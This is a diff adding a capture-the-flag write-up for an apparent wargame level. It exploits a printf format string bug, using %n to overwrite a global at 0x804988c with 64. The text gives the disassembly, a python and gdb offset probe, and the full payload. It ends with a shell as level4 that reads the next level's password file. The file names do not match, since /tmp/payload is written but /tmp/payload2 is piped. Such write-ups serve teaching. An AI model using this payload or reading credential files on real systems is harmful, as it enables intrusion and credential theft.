@@ -1,0 +1,37 @@
+We find a v() function called in function main() which contains :
+
+0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+0x080484da <+54>:    mov    0x804988c,%eax
+0x080484df <+59>:    cmp    $0x40,%eax
+0x080484e2 <+62>:    jne    0x8048518 <v+116>
+
+The goal here is to overwrite 0x804988c to 0x40 which is 64.
+
+In order to do this, we will use a format string attack by using the %n option in printf.
+
+%n allows us to write in memory the number of characters written beforehand.
+
+example : "abc%n" -> %n = 3.
+
+First, let's find the offset at which printf writes in memory.
+
+python -c  'print "A" * 30 + "%x " * 8' > /tmp/abc
+gdb level3
+b main
+r < /tmp/abc
+n
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 
+
+We notice that we start writing in memory at the offset 4.
+
+Finally, all is left is to add the 64 characters at address 0x804988c by doing :
+
+python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/payload
+
+and take control of the shell.
+
+cat /tmp/payload2 - | ./level3
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
